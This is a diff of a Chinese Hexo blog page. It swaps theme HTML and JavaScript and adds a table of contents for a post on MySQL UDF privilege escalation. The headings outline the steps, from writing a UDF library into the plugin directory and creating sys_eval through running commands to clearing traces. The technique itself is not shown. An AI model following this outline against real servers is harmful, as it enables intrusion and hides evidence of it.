+<widget class="widget-wrapper slide-up toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#21-%E7%AE%80%E4%BB%8B"><span class="toc-text">2.1 简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#22-%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-text">2.2 利用条件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#221-%E5%B8%B8%E8%A7%84%E6%83%85%E5%86%B5"><span class="toc-text">2.2.1 常规情况：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#222-%E7%89%B9%E6%AE%8A%E6%83%85%E5%86%B5"><span class="toc-text">2.2.2 特殊情况：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90"><span class="toc-text">查看当前数据库用户权限：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#23-%E7%89%88%E6%9C%AC%E7%89%B9%E6%80%A7"><span class="toc-text">2.3 版本特性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-mysql-lt-50"><span class="toc-text">1、 Mysql &lt; 5.0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-50-lt-mysql-lt-51"><span class="toc-text">2、 5.0 &lt;&#x3D; Mysql &lt; 5.1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-mysql-gt-51"><span class="toc-text">3、 Mysql &gt;&#x3D; 5.1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#24-udf%E6%96%87%E4%BB%B6%E4%BD%8D%E7%BD%AE"><span class="toc-text">2.4 UDF文件位置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-sqlmap"><span class="toc-text">1、sqlmap：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-metaspliot"><span class="toc-text">2、metaspliot：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#25-%E6%93%8D%E4%BD%9C%E6%AD%A5%E9%AA%A4"><span class="toc-text">2.5 操作步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%9F%A5%E7%9C%8B%E5%8F%AF%E5%AF%BC%E5%87%BA%E6%96%87%E4%BB%B6%E4%BD%8D%E7%BD%AE"><span class="toc-text">1、查看可导出文件位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90"><span class="toc-text">2、查看当前数据库用户权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%A1%AE%E8%AE%A4mysql%E5%AE%89%E8%A3%85%E4%BD%8D%E7%BD%AE"><span class="toc-text">3、确认mysql安装位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E9%80%9A%E8%BF%87%E4%B8%BB%E6%9C%BA%E7%89%88%E6%9C%AC%E5%8F%8A%E6%9E%B6%E6%9E%84%E7%A1%AE%E8%AE%A4mysql%E4%BD%8D%E6%95%B0%E6%9D%A5%E9%80%89%E7%94%A8udf%E6%96%87%E4%BB%B6"><span class="toc-text">4、通过主机版本及架构确认mysql位数来选用udf文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%88%E6%9C%AC%E5%88%A4%E6%96%ADudf%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E4%BD%8D%E7%BD%AE"><span class="toc-text">5、查看数据库版本，判断udf文件写入位置</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#51-mysql%E5%A4%A7%E4%BA%8E51%E7%89%88%E6%9C%AC%E6%97%B6"><span class="toc-text">5.1 mysql大于5.1版本时</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#512-sqlmap-udf%E6%96%87%E4%BB%B6%E8%A7%A3%E7%A0%81"><span class="toc-text">5.1.2 sqlmap udf文件解码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#513-16%E8%BF%9B%E5%88%B6%E7%BC%96%E7%A0%81udf%E6%96%87%E4%BB%B6"><span class="toc-text">5.1.3 16进制编码udf文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#514-udf%E5%86%99%E5%85%A5plugin%E7%9B%AE%E5%BD%95"><span class="toc-text">5.1.4 udf写入plugin目录</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#515-%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%A1%A8%E5%B9%B6%E5%B0%86%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%95%B0%E6%8D%AE%E6%8F%92%E5%85%A5%E5%88%B0%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E7%BC%96%E7%A0%81%E6%B5%81"><span class="toc-text">5.1.5 创建一个表并将二进制数据插入到十六进制编码流</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#516-%E9%9A%8F%E4%BE%BF%E9%80%89%E6%8B%A9%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8E%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%A1%A8"><span class="toc-text">5.1.6 随便选择一个数据库后，创建一个表</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#517-insert%E6%8F%92%E5%85%A5%E7%AC%AC%E4%B8%80%E6%AE%B5%E6%95%B0%E6%8D%AE"><span class="toc-text">5.1.7 insert插入第一段数据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#518-update%E6%8B%BC%E6%8E%A5%E5%89%A9%E4%BD%99%E6%95%B0%E6%8D%AE"><span class="toc-text">5.1.8 update拼接剩余数据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#519-%E5%AF%BC%E5%87%BA%E8%A1%A8%E4%B8%AD%E6%95%B0%E6%8D%AE%E5%88%B0%E7%B3%BB%E7%BB%9F%E7%A3%81%E7%9B%98"><span class="toc-text">5.1.9 导出表中数据到系统磁盘</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#52-mysql%E5%B0%8F%E4%BA%8E51%E7%89%88%E6%9C%AC%E6%97%B6"><span class="toc-text">5.2 mysql小于5.1版本时：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E5%88%9B%E5%BB%BA%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-text">6、创建命令执行函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">7、命令执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#26-%E7%97%95%E8%BF%B9%E6%B8%85%E9%99%A4"><span class="toc-text">2.6 痕迹清除</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#261-%E5%88%A0%E9%99%A4%E8%A1%A8"><span class="toc-text">2.6.1 删除表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#262-%E5%88%A0%E9%99%A4%E5%87%BD%E6%95%B0"><span class="toc-text">2.6.2 删除函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#27-%E5%85%B6%E4%BB%96%E9%97%AE%E9%A2%98"><span class="toc-text">2.7 其他问题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-error-1125-hy000"><span class="toc-text">1、ERROR 1125 (HY000)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%8F%90%E7%A4%BAsys_eval-%E5%87%BD%E6%95%B0%E5%B7%B2%E7%BB%8F%E5%AD%98%E5%9C%A8%E4%BD%86%E6%97%A0%E6%B3%95%E5%88%A9%E7%94%A8"><span class="toc-text">2、提示sys_eval 函数已经存在，但无法利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%88%9B%E5%BB%BAsys_eval-%E5%87%BD%E6%95%B0%E6%97%B6%E6%8F%90%E7%A4%BA%E5%B7%B2%E7%BB%8F%E5%AD%98%E5%9C%A8%E4%BD%86%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%A0%E9%99%A4%E6%97%B6%E6%8F%90%E7%A4%BA-sys_eval"><span class="toc-text">3、创建sys_eval 函数时提示已经存在，但利用与删除时提示 sys_eval</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-error-1126-hy000"><span class="toc-text">4、ERROR 1126 (HY000)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#28-%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-text">2.8 修复建议</span></a></li></ol></div><div class="widget-footer">
+
+<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a><a class="buttom" onclick="util.scrollComment()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M10.46 1.25h3.08c1.603 0 2.86 0 3.864.095c1.023.098 1.861.3 2.6.752a5.75 5.75 0 0 1 1.899 1.899c.452.738.654 1.577.752 2.6c.095 1.004.095 2.261.095 3.865v1.067c0 1.141 0 2.036-.05 2.759c-.05.735-.153 1.347-.388 1.913a5.75 5.75 0 0 1-3.112 3.112c-.805.334-1.721.408-2.977.43a10.81 10.81 0 0 0-.929.036c-.198.022-.275.054-.32.08c-.047.028-.112.078-.224.232c-.121.166-.258.396-.476.764l-.542.916c-.773 1.307-2.69 1.307-3.464 0l-.542-.916a10.605 10.605 0 0 0-.476-.764c-.112-.154-.177-.204-.224-.232c-.045-.026-.122-.058-.32-.08c-.212-.023-.49-.03-.93-.037c-1.255-.021-2.171-.095-2.976-.429A5.75 5.75 0 0 1 1.688 16.2c-.235-.566-.338-1.178-.389-1.913c-.049-.723-.049-1.618-.049-2.76v-1.066c0-1.604 0-2.86.095-3.865c.098-1.023.3-1.862.752-2.6a5.75 5.75 0 0 1 1.899-1.899c.738-.452 1.577-.654 2.6-.752C7.6 1.25 8.857 1.25 10.461 1.25M6.739 2.839c-.914.087-1.495.253-1.959.537A4.25 4.25 0 0 0 3.376 4.78c-.284.464-.45 1.045-.537 1.96c-.088.924-.089 2.11-.089 3.761v1c0 1.175 0 2.019.046 2.685c.045.659.131 1.089.278 1.441a4.25 4.25 0 0 0 2.3 2.3c.515.214 1.173.294 2.429.316h.031c.398.007.747.013 1.037.045c.311.035.616.104.909.274c.29.17.5.395.682.645c.169.232.342.525.538.856l.559.944a.52.52 0 0 0 .882 0l.559-.944c.196-.331.37-.624.538-.856c.182-.25.392-.476.682-.645c.293-.17.598-.24.909-.274c.29-.032.639-.038 1.037-.045h.032c1.255-.022 1.913-.102 2.428-.316a4.25 4.25 0 0 0 2.3-2.3c.147-.352.233-.782.278-1.441c.046-.666.046-1.51.046-2.685v-1c0-1.651 0-2.837-.089-3.762c-.087-.914-.253-1.495-.537-1.959a4.25 4.25 0 0 0-1.403-1.403c-.464-.284-1.045-.45-1.96-.537c-.924-.088-2.11-.089-3.761-.089h-3c-1.651 0-2.837 0-3.762.089" clip-rule="evenodd"/><path fill="currentColor" d="M9 11a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0"/></svg><span>参与讨论</span></a></div></widget>
+</div></aside><div class='float-panel blur'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
 </div>
+</div><div class="scripts">
+<script type="text/javascript">
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+  };
 
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+  };
+  const deps = {
+    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
+    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
+  }
+  
 
+</script>
 
-<!-- 代码块功能依赖 -->
-<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+<script type="text/javascript">
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
 
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
 
-  <!-- 是否加载使用自带的 prismjs. -->
-  <script type="text/javascript" src="/libs/prism/prism.js"></script>
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+    
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      let retryTimes = 3;
+      utils.onLoading(el);
+      function req() {
+        return new Promise((resolve, reject) => {
+          let status = 0; // 0 等待 1 完成 2 超时
+          let timer = setTimeout(() => {
+            if (status === 0) {
+              status = 2;
+              timer = null;
+              reject('请求超时');
+              if (retryTimes == 0) {
+                onFailure();
+              }
+            }
+          }, 5000);
+          fetch(url).then(function(response) {
+            if (status !== 2) {
+              clearTimeout(timer);
+              resolve(response);
+              timer = null;
+              status = 1;
+            }
+            if (response.ok) {
+              return response.json();
+            }
+            throw new Error('Network response was not ok.');
+          }).then(function(data) {
+            retryTimes = 0;
+            utils.onLoadSuccess(el);
+            callback(data);
+          }).catch(function(error) {
+            if (retryTimes > 0) {
+              retryTimes -= 1;
+              setTimeout(() => {
+                req();
+              }, 5000);
+            } else {
+              utils.onLoadFailure(el);
+              onFailure();
+            }
+          });
+        });
+      }
+      req();
+    },
+  };
+</script>
 
-
-<!-- 代码语言 -->
-
-
-<!-- 代码块复制 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
-
-
-<!-- 代码块收缩 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
-
-
-
-    </div>
-    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
-        <div class="toc-widget card" style="background-color: white;">
-            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
-            <div id="toc-content"></div>
-        </div>
-    </div>
-</div>
-
-<!-- TOC 悬浮按钮. -->
-
-<div id="floating-toc-btn" class="hide-on-med-and-down">
-    <a class="btn-floating btn-large bg-color">
-        <i class="fas fa-list-ul"></i>
-    </a>
-</div>
-
-
-<script src="/libs/tocbot/tocbot.min.js"></script>
 <script>
-    $(function () {
-        tocbot.init({
-            tocSelector: '#toc-content',
-            contentSelector: '#articleContent',
-            headingsOffset: -($(window).height() * 0.4 - 45),
-            collapseDepth: Number('3'),
-            headingSelector: 'h2, h3, h4, h5, h6'
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.28.1" async></script>
+
+<!-- optional -->
+
+  <script>
+    function load_twikoo() {
+        if (!document.querySelectorAll("#twikoo_container")[0]) return;
+        utils.js('https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js', {defer: true}).then(function () {
+            const el = document.getElementById("twikoo_container");
+            var path = el.getAttribute('comment_id');
+            if (!path) {
+                path = decodeURI(window.location.pathname);
+            }
+            twikoo.init(Object.assign({"js":"https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js","envId":"https://blog-comments-phi.vercel.app"}, {
+                el: '#twikoo_container',
+                path: path,
+            }));
         });
+    }
 
-        // Set scroll toc fixed.
-        let tocHeight = parseInt($(window).height() * 0.4 - 64);
-        let $tocWidget = $('.toc-widget');
-        $(window).scroll(function () {
-            let scroll = $(window).scrollTop();
-            /* add post toc fixed. */
-            if (scroll > tocHeight) {
-                $tocWidget.addClass('toc-fixed');
-            } else {
-                $tocWidget.removeClass('toc-fixed');
-            }
-        });
-
-        
-        /* 修复文章卡片 div 的宽度. */
-        let fixPostCardWidth = function (srcId, targetId) {
-            let srcDiv = $('#' + srcId);
-            if (srcDiv.length === 0) {
-                return;
-            }
-
-            let w = srcDiv.width();
-            if (w >= 450) {
-                w = w + 21;
-            } else if (w >= 350 && w < 450) {
-                w = w + 18;
-            } else if (w >= 300 && w < 350) {
-                w = w + 16;
-            } else {
-                w = w + 14;
-            }
-            $('#' + targetId).width(w);
-        };
-
-        // 切换TOC目录展开收缩的相关操作.
-        const expandedClass = 'expanded';
-        let $tocAside = $('#toc-aside');
-        let $mainContent = $('#main-content');
-        $('#floating-toc-btn .btn-floating').click(function () {
-            if ($tocAside.hasClass(expandedClass)) {
-                $tocAside.removeClass(expandedClass).hide();
-                $mainContent.removeClass('l9');
-            } else {
-                $tocAside.addClass(expandedClass).show();
-                $mainContent.addClass('l9');
-            }
-            fixPostCardWidth('artDetail', 'prenext-posts');
-        });
-        
+    window.addEventListener('DOMContentLoaded', (event) => {
+        load_twikoo();
     });
 </script>
 
-    
-
-</main>
 
 
-
-
-    <footer class="page-footer bg-color">
-    
-
-    <div class="container row center-align"
-         style="margin-bottom: 0px !important;">
-        <div class="col s12 m8 l8 copy-right">
-            Copyright&nbsp;&copy;
-            
-                <span id="year">2019-2024</span>
-            
-            <a href="/about" target="_blank">hybcx</a>
-            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
-            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
-            
-            <br>
-            
-                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">861.1k</span>
-            
-            
-            
-            
-                <span id="busuanzi_container_site_pv">
-                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
-                    <span id="busuanzi_value_site_pv" class="white-color"></span>
-            </span>
-            
-            
-                <span id="busuanzi_container_site_uv">
-                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
-                    <span id="busuanzi_value_site_uv" class="white-color"></span>
-            </span>
-            
-            <br>
-
-            <!-- 运行天数提醒. -->
-            
-            <br>
-            
-        </div>
-        <div class="col s12 m4 l4 social-link ">
-    <a href="https://github.com/hybchenxing/" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
-        <i class="fab fa-github"></i>
-    </a>
-
-
-
-    <a href="mailto:2235199080@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
-        <i class="fas fa-envelope-open"></i>
-    </a>
-
-
-
-    <a href="https://www.facebook.com/profile.php?id=61555427038857" class="tooltipped" target="_blank" data-tooltip="关注我的Facebook: https://www.facebook.com/profile.php?id=61555427038857" data-position="top" data-delay="50">
-        <i class="fab fa-facebook-f"></i>
-    </a>
-
-
-
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2235199080" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2235199080" data-position="top" data-delay="50">
-        <i class="fab fa-qq"></i>
-    </a>
-
-
-
-
-
-
-
-    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
-        <i class="fas fa-rss"></i>
-    </a>
-
-</div>
-    </div>
-</footer>
-
-<div class="progress-bar"></div>
-
-
-    <!-- 搜索遮罩框 -->
-<div id="searchModal" class="modal">
-    <div class="modal-content">
-        <div class="search-header">
-            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
-            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
-                   class="search-input">
-        </div>
-        <div id="searchResult"></div>
-    </div>
-</div>
-
-<script type="text/javascript">
-$(function () {
-    var searchFunc = function (path, search_id, content_id) {
-        'use strict';
-        $.ajax({
-            url: path,
-            dataType: "xml",
-            success: function (xmlResponse) {
-                // get the contents from search data
-                var datas = $("entry", xmlResponse).map(function () {
-                    return {
-                        title: $("title", this).text(),
-                        content: $("content", this).text(),
-                        url: $("url", this).text()
-                    };
-                }).get();
-                var $input = document.getElementById(search_id);
-                var $resultContent = document.getElementById(content_id);
-                $input.addEventListener('input', function () {
-                    var str = '<ul class=\"search-result-list\">';
-                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
-                    $resultContent.innerHTML = "";
-                    if (this.value.trim().length <= 0) {
-                        return;
-                    }
-                    // perform local searching
-                    datas.forEach(function (data) {
-                        var isMatch = true;
-                        var data_title = data.title.trim().toLowerCase();
-                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
-                        var data_url = data.url;
-                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
-                        var index_title = -1;
-                        var index_content = -1;
-                        var first_occur = -1;
-                        // only match artiles with not empty titles and contents
-                        if (data_title !== '' && data_content !== '') {
-                            keywords.forEach(function (keyword, i) {
-                                index_title = data_title.indexOf(keyword);
-                                index_content = data_content.indexOf(keyword);
-                                if (index_title < 0 && index_content < 0) {
-                                    isMatch = false;
-                                } else {
-                                    if (index_content < 0) {
-                                        index_content = 0;
-                                    }
-                                    if (i === 0) {
-                                        first_occur = index_content;
-                                    }
-                                }
-                            });
-                        }
-                        // show search results
-                        if (isMatch) {
-                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
-                            var content = data.content.trim().replace(/<[^>]+>/g, "");
-                            if (first_occur >= 0) {
-                                // cut out 100 characters
-                                var start = first_occur - 20;
-                                var end = first_occur + 80;
-                                if (start < 0) {
-                                    start = 0;
-                                }
-                                if (start === 0) {
-                                    end = 100;
-                                }
-                                if (end > content.length) {
-                                    end = content.length;
-                                }
-                                var match_content = content.substr(start, end);
-                                // highlight all keywords
-                                keywords.forEach(function (keyword) {
-                                    var regS = new RegExp(keyword, "gi");
-                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
-                                });
-
-                                str += "<p class=\"search-result\">" + match_content + "...</p>"
-                            }
-                            str += "</li>";
-                        }
-                    });
-                    str += "</ul>";
-                    $resultContent.innerHTML = str;
-                });
-            }
-        });
-    };
-
-    searchFunc('/search.xml', 'searchInput', 'searchResult');
-});
-</script>
-
-    <!-- 白天和黑夜主题 -->
-<div class="stars-con">
-    <div id="stars"></div>
-    <div id="stars2"></div>
-    <div id="stars3"></div>  
-</div>
-
-<script>
-    function switchNightMode() {
-        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
-        setTimeout(function () {
-            $('body').hasClass('DarkMode') 
